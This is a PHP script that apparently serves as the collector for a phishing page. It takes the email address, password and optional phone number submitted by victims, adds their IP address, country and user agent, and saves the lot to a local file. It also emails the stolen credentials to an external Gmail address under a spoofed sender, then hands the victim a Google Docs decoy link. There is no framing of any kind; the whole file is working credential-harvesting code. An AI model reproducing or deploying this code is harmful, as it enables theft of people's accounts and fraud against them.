<?php

function generateKey($length = 20) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $count = mb_strlen($chars);

    for ($i = 0, $result = ''; $i < $length; $i++) {
        $index = rand(0, $count - 1);
        $result .= mb_substr($chars, $index, 1);
    }

    return $result;
}

function getLocationInfoByIp(){

    $client  = @$_SERVER['HTTP_CLIENT_IP'];

    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];

    $remote  = @$_SERVER['REMOTE_ADDR'];

    $result  = array('country'=>'', 'city'=>'');

    if(filter_var($client, FILTER_VALIDATE_IP)){

        $ip = $client;

    }elseif(filter_var($forward, FILTER_VALIDATE_IP)){

        $ip = $forward;

    }else{

        $ip = $remote;

    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));    

    if($ip_data && $ip_data->geoplugin_countryName != null){

        $result['country'] = $ip_data->geoplugin_countryCode;

        $result['city'] = $ip_data->geoplugin_city;

    }

    return $result;

}

$username = $_POST["em"];
$password = $_POST["psw"];
$post_server = $_POST["sub"];
$ip = $_SERVER['REMOTE_ADDR'];
$u = $_SERVER['HTTP_USER_AGENT'];
$iso_code = getLocationInfoByIp();
$info = '['.$post_server.']'.$username.':'.$password.':'.$ip.':'.$iso_code['country'].PHP_EOL;

$file = 'result.txt';
$current = file_get_contents($file);
$current .= $info;
file_put_contents($file, $current);

$subject = '[MAILS] NEW GUY ['.$post_server.']'; 
$to = 'martinsjoyce5@gmail.com';
$message = ' 
<html> 
    <head> 
        <title>[MAILS] NEW GUY['.$post_server.']</title> 
    </head> 
    <body>   
		<p>Email: '.$username.'</p>
		<p>Password: '.$password.'</p> ';
		
if (isset($_POST['phn'])){
    $message .= '<p>Phone: '.$_POST['phn'].'</p>';
}
		
$message .=        '<p>Email server: '.$post_server.'</p>
        <p>IP: '.$ip.'</p> 
        <p>Country: '.$iso_code['country'].'</p>
        <p>User-Agent: '.$u.'</p> 
    </body> 
</html>'; 

$headers  = "Content-type: text/html; charset=windows-1251 \r\n"; 
$headers .= "From: sIaP_Team <info@kryptex.pw>\r\n"; 
mail($to, $subject, $message, $headers); 


echo "https://docs.google.com/document/d/13qUEngtHuKjtvGoPaMl3x6cEnT2oO6lSWOccM-PkXKk";
?>